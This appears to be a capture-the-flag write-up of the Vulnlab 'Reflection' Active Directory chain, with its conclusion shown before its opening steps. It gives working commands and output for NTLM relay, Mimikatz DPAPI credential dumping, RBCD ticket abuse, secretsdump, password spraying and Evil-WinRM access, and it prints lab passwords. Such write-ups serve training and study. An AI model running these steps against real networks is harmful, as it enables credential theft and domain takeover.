plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; schtasks /query /v /fo LIST &gt; tasklist.txt</span><br></pre></td></tr></table></figure>\n\n<p>We can pull this to our local Kali machine through Sliver to read it. I found an interesting task denoted as <code>\\Backup</code> that seems to be owned by <code>Georgia.Price</code>.</p>\n<p><img src=\"/images/vulnlab/reflection-vl/g.png\"></p>\n<p>This task seems to be running as that user, which prompts us to attempt to see if we can edit it. Luckily enough we don’t have to do that through PowerShell, as we have Administrator access to RDP so we can just do it through the Task Scheduler GUI. The only issue with this method is that we are required to enter <code>Georgia.Price</code>‘s credentials in order to edit the scheduled task. If we had the ability to do this, we could easily MITM the <code>ls</code> request and point it to Responder, to which we could then try to crack the NetNTLMv2 hash that we’d receive.</p>\n<h1 id=\"Dumping-DPAPI-Cached-Credentials\"><a href=\"#Dumping-DPAPI-Cached-Credentials\" class=\"headerlink\" title=\"Dumping DPAPI Cached Credentials\"></a>Dumping DPAPI Cached Credentials</h1><p>So pulling this all together, it does not seem that any of the aforementioned methods are usable to receive <code>Georgia.Price</code>‘s plaintext credentials. However, as I showed from before we do have access to a few master keys that may correspond to cached DPAPI credentials.</p>\n<p>We can run <a href=\"https://github.com/GhostPack/Seatbelt\">Seatbelt</a> from Sliver C2, you could also compile it with Visual Studio and drop the executable to the filesystem. The Sliver armory contains <code>seatbelt</code> so we’ll just do it from there.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (reflection) &gt; seatbelt WindowsCredentialFiles</span><br><span class=\"line\">......</span><br><span class=\"line\">  Folder : C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials</span><br><span class=\"line\"></span><br><span class=\"line\">    FileName     : 2A5FD8B6E555858DE1974096F0A5DD39</span><br><span class=\"line\">    Description  : Local Credential Data</span><br><span class=\"line\">    MasterKey    : d0486e64-ff99-4f38-8962-56d7767effbd</span><br><span class=\"line\">    Accessed     : 6/7/2023 12:22:44 PM</span><br><span class=\"line\">    Modified     : 6/7/2023 12:22:44 PM</span><br><span class=\"line\">    Size         : 576</span><br></pre></td></tr></table></figure>\n\n<p>If you remember earlier, the master key was a relatively long string of text at the bottom of our DMP file. That is the unencrypted master key, which normally we would use the corresponding GUID to decrypt it. Luckily enough, now that we have the decrypted master key, we just need to plug the right one into its respective credential file.</p>\n<p>I left one of the credential files in the above output as it corresponds to the GUID that was listed for one of the DPAPI master keys from the DMP file. There is another credential file with the same GUID, however I found after some testing that it is not the correct credential file for us to exploit. This just takes some trial and error if you have the same GUID for multiple master keys.</p>\n<p>If we have the correct master key and its corresponding credential file, we should be able to dump the credential blob (otherwise being the plaintext password) for the user it belongs to. I’ll put all of the respective attributes that we have to dump the credential blob.</p>\n<ul>\n<li>Key GUID - <code>d0486e64-ff99-4f38-8962-56d7767effbd</code></li>\n<li>Master Key - <code>ca00bf269b1c1879ad1d664d6fadd9d4169b408e953d9acfece3476622fccc85c72b0e9879222b12a08ec6ee3f1c55d5b772d3d404c520c886413321af99caf0</code></li>\n<li>Credential File - <code>C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\2A5FD8B6E555858DE1974096F0A5DD39</code></li>\n</ul>\n<p>Given that we have all of the assets required, let’s use Mimikatz once more to dump the credential blob. I’ve found that running through WinRM prompts an error, however if you log in as the Administrator through RDP it should work as intended.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\Administrator\\Documents&gt; .\\mimikatz.exe &quot;dpapi::cred /in:C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\2A5FD8B6E555858DE1974096F0A5DD39 /masterkey:ca00bf269b1c1879ad1d664d6fadd9d4169b408e95[...snip...]3f1c55d5b772d3d404c520c886413321af99caf0&quot; &quot;exit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">......</span><br><span class=\"line\">  TargetName     : Domain:batch=TaskScheduler:Task:&#123;013CD3ED-72CB-4801-99D7-8E7CA1F7E370&#125;</span><br><span class=\"line\">  UnkData        : (null)</span><br><span class=\"line\">  Comment        : (null)</span><br><span class=\"line\">  TargetAlias    : (null)</span><br><span class=\"line\">  UserName       : REFLECTION\\Georgia.Price</span><br><span class=\"line\">  CredentialBlob : [...snip...]</span><br><span class=\"line\">  Attributes     : 0</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, this credential file seemed to correspond to <code>Georgia.Price</code>. Our theory for task scheduler from before was half correct, as the plaintext password for the user is stored on this task. The credential blob that we dumped corresponded to this specific task scheduler credential attribute, as this is where it is stored.</p>\n<h1 id=\"Exploiting-Resource-Based-Constrained-Delegation\"><a href=\"#Exploiting-Resource-Based-Constrained-Delegation\" class=\"headerlink\" title=\"Exploiting Resource-Based Constrained Delegation\"></a>Exploiting Resource-Based Constrained Delegation</h1><p>We can now use the <code>GenericAll</code> permissions as <code>Georgia.Price</code> to exploit the <code>WS01</code> workstation.</p>\n<p>I tested for LAPS once again to see if we could read the corresponding LAPS password, however I did not come back with any results. This is because unlike <code>MS01</code>, <code>WS01</code> does not have LAPS configured to run.</p>\n<p>Despite this, we do have another exploit that we can test - RBCD. Resource-based constrained delegation essentially allows us to utilize a compromised machine account to request for a service ticket in which we impersonate the user that it belongs to. The reason that this did not work before is that we did not have control over a machine account that could do this. However, now that we do have one being <code>MS01$</code>, we can exploit this functionality.</p>\n<p>We’ll first need to set the delegation properties between <code>MS01$</code> and <code>WS01$</code> respectively so that <code>MS01</code> can perform delegation on behalf of users in <code>WS01</code>. Impacket has a utility to do this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-rbcd -delegate-from &#x27;MS01$&#x27; -delegate-to &#x27;WS01$&#x27; -action &#x27;write&#x27; &#x27;reflection.vl/georgia.price:[...snip...]&#x27;</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span><br><span class=\"line\">[*] Delegation rights modified successfully!</span><br><span class=\"line\">[*] MS01$ can now impersonate users on WS01$ via S4U2Proxy</span><br><span class=\"line\">[*] Accounts allowed to act on behalf of other identity:</span><br><span class=\"line\">[*]     MS01$        (S-1-5-21-3375389138-1770791787-1490854311-1104)</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have that set, we can now exploit S4U2Proxy to request for a service ticket to CIFS (being SMB) as the Administrator user.</p>\n<p>The only stipulate here is that we’ll need the plaintext password of the <code>MS01$</code> machine account to do this. We did dump all the credentials to the <code>MS01</code> machine earlier from Mimikatz, so we can use the machine account’s NTLM hash and pass-the-hash to Impacket command we’re about to run.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-getST -spn &#x27;cifs/ws01.reflection.vl&#x27; -impersonate &#x27;Administrator&#x27; &#x27;reflection.vl/MS01$&#x27; -hashes :548f3a[...snip...]0eaadb1</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[-] CCache file is not found. Skipping...</span><br><span class=\"line\">[*] Getting TGT for user</span><br><span class=\"line\">[*] Impersonating Administrator</span><br><span class=\"line\">[*] Requesting S4U2self</span><br><span class=\"line\">[*] Requesting S4U2Proxy</span><br><span class=\"line\">[*] Saving ticket in Administrator@cifs_ws01.reflection.vl@REFLECTION.VL.ccache</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have a saved Kerberos service ticket as the Administrator user, we can now dump the secrets of <code>WS01</code> remotely with <code>secretsdump</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-secretsdump -k ws01.reflection.vl                                  </span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Service RemoteRegistry is in stopped state</span><br><span class=\"line\">[*] Service RemoteRegistry is disabled, enabling it</span><br><span class=\"line\">[*] Starting service RemoteRegistry</span><br><span class=\"line\">......</span><br><span class=\"line\">REFLECTION\\WS01$:aad3b435b51404eeaad3b435b51404ee:755b20085[...snip...]4c9e:::</span><br><span class=\"line\">[*] DefaultPassword </span><br><span class=\"line\">reflection.vl\\Rhys.Garner:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>This will eventually dump the password for <code>Rhys.Garner</code>, who is a local administrator on <code>WS01</code>. This means using their credentials we should be able to authenticate to RDP to this workstation. I found that WinRM authentication wasn’t working me, so RDP is another alternative.</p>\n<p><img src=\"/images/vulnlab/reflection-vl/h.png\"></p>\n<p>As you can see, the second flag is within the Desktop directory for this user.</p>\n<h1 id=\"Pivoting-to-DC01\"><a href=\"#Pivoting-to-DC01\" class=\"headerlink\" title=\"Pivoting to DC01\"></a>Pivoting to DC01</h1><p>So our next and final step to compromising this environment is to take control over the DC from here. Note that if we want to get a session as SYSTEM on <code>WS01</code>, we can use Sliver’s built-in <code>getsystem</code> command which will spawn a new session as SYSTEM.</p>\n<p>I tried a few different tactics such as viewing the cached Kerberos credentials on this machine, to which I found that there was an <code>LDAP</code> cached ticket for <code>Rhys.Garner</code> from the DC. I tried a few tactics that came to mind when I saw this, such as requesting for an alternate service name for CIFS on the DC. That did not seem to work, so I decided to pivot elsewhere. There are also no credentials or applications that we could exploit on this machine, so the exploit has to be externally through AD ACLs.</p>\n<p>Now when I had figured out what to do, it seemed incredibly simple in hindsight. This is a tactic that is always worth a try to give if you have credentials, which is the idea of password reusage. Spraying passwords that you currently own to other users is never a bad idea unless you’re in an environment that restricts brute-forcing. In our case, that does not seem to be an issue.</p>\n<p>I pulled all of the users from Bloodhound and placed them into a wordlist, you can do so just simply by creating a text file and reading from all of the domain user nodes.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat ul.txt    </span><br><span class=\"line\">dom_rgarner</span><br><span class=\"line\">svc_web_prod</span><br><span class=\"line\">svc_web_staging</span><br><span class=\"line\">deborah.collins</span><br><span class=\"line\">jeremy_marshall</span><br><span class=\"line\">rhys.garner</span><br><span class=\"line\">dylan.marsh</span><br><span class=\"line\">dorothy.rose</span><br><span class=\"line\">craig.williams</span><br><span class=\"line\">bethany.wright</span><br><span class=\"line\">abbie.smith</span><br><span class=\"line\">michael.wilkinson</span><br><span class=\"line\">labadm</span><br><span class=\"line\">georgia.price</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have this user list, let’s see if <code>georgia.price</code> shares a password with any of these users. We can do so with <code>crackmapexec</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec smb 10.10.255.149 -u ul.txt -p &#x27;[...snip...]&#x27;   </span><br><span class=\"line\">SMB         10.10.255.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.255.149   445    DC01             [+] reflection.vl\\dom_rgarner:[...snip...] (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>We can see that a successful authentication attempt came back for <code>dom_rgarner</code>. I verified that the user <code>dom_rgarner</code> is a domain admin and also has access to WinRM on the DC. You can view this in Bloodhound on the user’s node.</p>\n<p>So given that we have access to a domain admin, we can now take hold of the DC and authenticate to it to complete this chain. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.255.149 -u &#x27;dom_rgarner&#x27; -p &#x27;[...snip...]&#x27;</span><br><span class=\"line\"> </span><br><span class=\"line\">Evil-WinRM shell v3.5</span><br><span class=\"line\">   </span><br><span class=\"line\">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                        </span><br><span class=\"line\">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class=\"line\"> </span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\dom_rgarner\\Documents&gt; cat C:\\Users\\Administrator\\Desktop\\flag.txt</span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\dom_rgarner\\Documents&gt; hostname</span><br><span class=\"line\">dc01</span><br></pre></td></tr></table></figure>\n\n<p>As seen above, we are able to read the last flag within the Administrator home directory. This means that we have successfully compromised this chain!</p>\n<p><img src=\"/images/vulnlab/reflection-vl/i.png\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This chain was very fun, and it definitely was a hard-hitter for Windows pivoting and privilege escalation. Learning how to do NTLM relay was very different, and I believe that it definitely helped with strengthening some skills. Big thanks to xct and r0BIT for developing this chain, it was great!</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py\">https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py</a><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://github.com/BloodHoundAD/BloodHound\">https://github.com/BloodHoundAD/BloodHound</a><br><a href=\"https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview\">https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://github.com/ParrotSec/mimikatz\">https://github.com/ParrotSec/mimikatz</a><br><a href=\"https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\">https://learn.microsoft.com/en-us/sysinternals/downloads/procdump</a><br><a href=\"https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz\">https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz</a><br><a href=\"https://dan-feliciano.com/2024/06/05/tengu/\">https://dan-feliciano.com/2024/06/05/tengu/</a><br><a href=\"https://github.com/GhostPack/Seatbelt\">https://github.com/GhostPack/Seatbelt</a></p>\n","cover_type":"img","excerpt":"","more":"<p>Reflection was another chain that consisted of three different machines - which is relatively similar to what we saw in Tengu. The great thing about this specifically in my case is the fact that there doesn’t seem to be any web-application testing on the internal side. While I am still working to improve my web-application testing skills, a break from it every now and then is more than welcome.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Our three machines are <code>10.10.255.149-151</code>. We’ll query each of these with the NMAP scans that we usually run.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.255.149 &amp;&amp; sudo nmap 10.10.255.150 &amp;&amp; sudo nmap 10.10.255.151</span><br><span class=\"line\"></span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 00:16 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.255.149</span><br><span class=\"line\">Host is up (0.12s latency).</span><br><span class=\"line\">Not shown: 987 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">1433/tcp open  ms-sql-s</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 00:16 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.255.150</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 996 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">1433/tcp open  ms-sql-s</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 00:19 EDT</span><br><span class=\"line\">Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class=\"line\">SYN Stealth Scan Timing: About 0.65% done</span><br><span class=\"line\">Nmap scan report for 10.10.255.151</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 997 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 20.11 seconds</span><br></pre></td></tr></table></figure>\n\n<p>It seems that this environment is solely Windows Active Directory, with no domain-joined Linux machines available. We have a domain controller running on <code>.53</code> given that both Kerberos and the DNS services are running on that machine. We then have two workstations on <code>.150</code> and <code>.151</code>, from which <code>.150</code> seems to be a workstation with an external facing MSSQL service (which is already a vulnerability).</p>\n<p>Note that if you wanted to view the domain names for each of the machines, I learned that you don’t have to use NMAP scripts to do so. You can simply use <code>crackmapexec</code> to query SMB on all of the workstations, as all of them contain this service.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec smb 10.10.255.149-167</span><br><span class=\"line\">SMB         10.10.255.150   445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.255.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.255.151   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False)</span><br></pre></td></tr></table></figure>\n\n<p>Given that both <code>MS01</code> and <code>WS01</code> have SMB and RDP running, my first guess is for us to attempt to interact with these services for any null authentication. We’ll give those a go starting with SMB with the below commands.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.255.(150 or 151) -N</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ smbclient -L 10.10.255.150 -N</span><br><span class=\"line\"></span><br><span class=\"line\">Sharename       Type      Comment</span><br><span class=\"line\">---------       ----      -------</span><br><span class=\"line\">ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">C$              Disk      Default share</span><br><span class=\"line\">IPC$            IPC       Remote IPC</span><br><span class=\"line\">staging         Disk      staging environment</span><br></pre></td></tr></table></figure>\n\n<p>It seems that on <code>MS01</code> (the workstation running MSSQL) allows us to list shares with null authentication. Furthermore, the share <code>staging</code> seems to be an uncommon name for a share so we’ll query this to see if there’s anything we can find.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient \\\\\\\\10.10.255.150\\\\staging -N</span><br><span class=\"line\">Try &quot;help&quot; to get a list of possible commands.</span><br><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Wed Jun  7 13:42:48 2023</span><br><span class=\"line\">  ..                                  D        0  Wed Jun  7 13:41:25 2023</span><br><span class=\"line\">  staging_db.conf                     A       50  Thu Jun  8 07:21:49 2023</span><br><span class=\"line\"></span><br><span class=\"line\">                6261245 blocks of size 4096. 1166816 blocks available</span><br><span class=\"line\">smb: \\&gt; get staging_db.conf</span><br><span class=\"line\">getting file \\staging_db.conf of size 50 as staging_db.conf (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)</span><br><span class=\"line\">smb: \\&gt; exit</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"MSSQL-Enumeration-on-MS01\"><a href=\"#MSSQL-Enumeration-on-MS01\" class=\"headerlink\" title=\"MSSQL Enumeration on MS01\"></a>MSSQL Enumeration on MS01</h1><p>We have access to the <code>staging_db.conf</code> being the only file in this share, so we’ll pull it to our localhost to see if it has any important information.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat staging_db.conf </span><br><span class=\"line\">user=web_staging</span><br><span class=\"line\">password=Washroom510</span><br><span class=\"line\">db=staging</span><br></pre></td></tr></table></figure>\n\n<p>The configuration file seems to have credentials for us for the <code>web_staging</code> user. I ran a few of these through crackmapexec to see if they’re valid credentials to the domain controller, however it does not seem that we can use it to query the DC.</p>\n<p>I gave a few of the services that are local to <code>MS01</code> a try such as SMB or RDP, however our credentials don’t seem to work to those services. Let’s look at the MSSQL service specifically, I had the initial thought that these credentials went there however I wanted to test for password reusage in the other areas of the environment before moving on.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (web_staging  dbo@staging)&gt; select * from users;</span><br><span class=\"line\">id   username   password        </span><br><span class=\"line\">--   --------   -------------   </span><br><span class=\"line\"> 1   b&#x27;dev01&#x27;   b&#x27;Initial123&#x27;   </span><br><span class=\"line\"></span><br><span class=\"line\"> 2   b&#x27;dev02&#x27;   b&#x27;Initial123&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>It seems like we have credentials from for two users, <code>dev01</code> and <code>dev02</code>. Unfortunately, I ran a few tests against CME as these users and it seems that there isn’t much that we can access from these users.</p>\n<h1 id=\"NTLM-Relay-to-DC01\"><a href=\"#NTLM-Relay-to-DC01\" class=\"headerlink\" title=\"NTLM Relay to DC01\"></a>NTLM Relay to DC01</h1><p>This lead me down to a new type of attack that we can exploit that follows a similar title to the name of the box. When I think of the word “Reflection”, the first type of attack with a similar connotation that comes to mind is relaying. There are various types of relaying attacks such as SMB, SMTP, or NTLM relay, so we’ll need to understand what we’re dealing with in order to determine the type of relay attack.</p>\n<p>Essentially our goal is to relay another user’s credentials that we do NOT know. At a low-level, this is essentially what relaying will do for us; relay a user’s authentication from one service on one machine to another service (potentially on another). I want to stress that this exploit is helpful when you’re able to trigger authentication attempts and relay them from an account that you do NOT own to another service.</p>\n<p>Our current situation may not seem to have those prerequisites, since we aren’t aware of any other users and their respective passwords. While we initially think that we only have access to three users currently, we actually have access to one more.</p>\n<p>The way I interpreted this may be incorrect and someone can feel free to correct on this if need be, however the fourth account that we can force an authentication attempt against is actually right in MSSQL. You see, when you execute a command in MSSQL or when you execute a query, it’s the service account that actually queries that information for you. While we don’t know the specific username to the service account (which can vary from box to box), we can force it to authenticate to a machine that we own.</p>\n<p>This can be done by utilizing the <code>xp_dirtree</code> MSSQL command built into Impacket, which essentially allows us to query a folder on the local host. This can also however, be used to query folders on remote hosts. This means we can point the directory listing command back to our local Kali machine. Our goal is to relay the authentication, however I just want to show the proof-of-concept of what I mean before we continue.</p>\n<p>We can boot up <code>responder</code> on a separate terminal pane with <code>sudo responder -I (VPN interface)</code>.</p>\n<p><img src=\"/images/vulnlab/reflection-vl/b.png\"></p>\n<p>As you can from the above, a successful hash was captured for <code>svc_web_staging</code>. While we probably can’t crack the hash for this account, this does prove that we have the ability to relay the credentials.</p>\n<p>To do this, we can use a tool from Impacket called <a href=\"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py\">ntlmrelayx</a>. This tool will relay the NTLM hash that we can see much like in Responder and use that NTLM hash to authenticate to another service. We can relay the credentials to any service on a target machine, should that service allow for NTLM authentication and allows <code>svc_web_staging</code> to authenticate to it. Let’s try SMB, though you could also point it to the MSSQL service on the DC if you’d like.</p>\n<p>We can start <code>ntlmrelayx</code> with the below command, ensuring that we specify the <code>-i</code> option for an interactive session.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-ntlmrelayx -t smb://10.10.255.149 -smb2support -i</span><br></pre></td></tr></table></figure>\n\n<p>This should launch about over 10 protocols that will listen for incoming requests, much like Responder did. All that’s left now is to query our localhost on the MSSQL workstation and forward the request to SMB.</p>\n<p><img src=\"/images/vulnlab/reflection-vl/c.png\"></p>\n<p>As you can see, an SMB client shell was started on our local machine on port 11000. We can connect to this easily using netcat. Be sure that you do NOT close out of <code>ntlmrelayx</code> until we’ve finished using the local shell.</p>\n<h1 id=\"SMB-MSSQL-Enumeration-on-DC01\"><a href=\"#SMB-MSSQL-Enumeration-on-DC01\" class=\"headerlink\" title=\"SMB&#x2F;MSSQL Enumeration on DC01\"></a>SMB&#x2F;MSSQL Enumeration on DC01</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ nc 127.0.0.1 11000</span><br><span class=\"line\">Type help for list of commands</span><br><span class=\"line\"># help</span><br><span class=\"line\"></span><br><span class=\"line\"> open &#123;host,port=445&#125; - opens a SMB connection against the target host/port</span><br></pre></td></tr></table></figure>\n\n<p>We seem to have a semi-interactive SMB shell, which has successfully connected to the DC through NTLM relay. We can now enumerate the SMB shares in the context of <code>svc_web_staging</code>. You can enumerate shares with the <code>shares</code> command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># shares</span><br><span class=\"line\">ADMIN$</span><br><span class=\"line\">C$</span><br><span class=\"line\">IPC$</span><br><span class=\"line\">NETLOGON</span><br><span class=\"line\">prod</span><br><span class=\"line\">SYSVOL</span><br><span class=\"line\"># use prod</span><br><span class=\"line\"># ls</span><br><span class=\"line\">drw-rw-rw-          0  Wed Jun  7 13:44:26 2023 .</span><br><span class=\"line\">drw-rw-rw-          0  Wed Jun  7 13:43:22 2023 ..</span><br><span class=\"line\">-rw-rw-rw-         45  Thu Jun  8 07:24:39 2023 prod_db.conf</span><br></pre></td></tr></table></figure>\n\n<p>As you can see from the above, there is a <code>prod_db.conf</code> file within the <code>prod</code> share, we’ll grab this to see if there’s anything we can find within it. You can do so with a simple <code>get</code> command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat prod_db.conf</span><br><span class=\"line\">user=web_prod</span><br><span class=\"line\">password=[...snip...]</span><br><span class=\"line\">db=prod</span><br></pre></td></tr></table></figure>\n\n<p>This file contains the password for <code>web_prod</code>, who I would assume much like <code>web_staging</code> is able to authenticate regularly to the MSSQL service on the DC. While you can’t verify this with <code>crackmapexec</code> as this requires your request to go to LDAP (which is currently blocking logins from untrusted domains).</p>\n<p>However if we attempt to log-in with Impacket, we can see that the request travels through as intended.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-mssqlclient reflection.vl/&#x27;web_prod&#x27;:&#x27;[...snip...]&#x27;@10.10.255.149                     </span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Encryption required, switching to TLS</span><br><span class=\"line\">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class=\"line\">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class=\"line\">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class=\"line\">[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class=\"line\">[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed language setting to us_english.</span><br><span class=\"line\">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) </span><br><span class=\"line\">[!] Press help for extra shell commands</span><br><span class=\"line\">SQL (web_prod  guest@master)&gt;</span><br></pre></td></tr></table></figure>\n\n<p>Let’s enumerate a little further into a few of the tables, I noticed immediately that there was a different table in this MSSQL service titled <code>prod</code>, so we’ll look into that. </p>\n<p>Note that if you relayed your <code>svc_web_staging</code> NTLM credentials to MSSQL when we were performing NTLM relay earlier, you would NOT have access to this database. This is because only <code>web_prod</code> is able to query it, meaning you would have to relay to SMB anyways. You’d be able to verify that the <code>prod_db.conf</code> file exists since you can query the local filesystem with <code>xp_dirtree</code> and you would notice that you can view the SMB shares from the <code>C:\\</code> drive.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (web_prod  guest@master)&gt; use prod</span><br><span class=\"line\">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: prod</span><br><span class=\"line\">[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed database context to &#x27;prod&#x27;.</span><br><span class=\"line\">SQL (web_prod  dbo@prod)&gt; select table_name from information_schema.tables</span><br><span class=\"line\">table_name   </span><br><span class=\"line\">----------   </span><br><span class=\"line\">users</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, there is a similar <code>users</code> table within this database, so let’s query it to see if there are any other credentials we can receive.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (web_prod  dbo@prod)&gt; select * from users</span><br><span class=\"line\">id   name              password            </span><br><span class=\"line\">--   ---------------   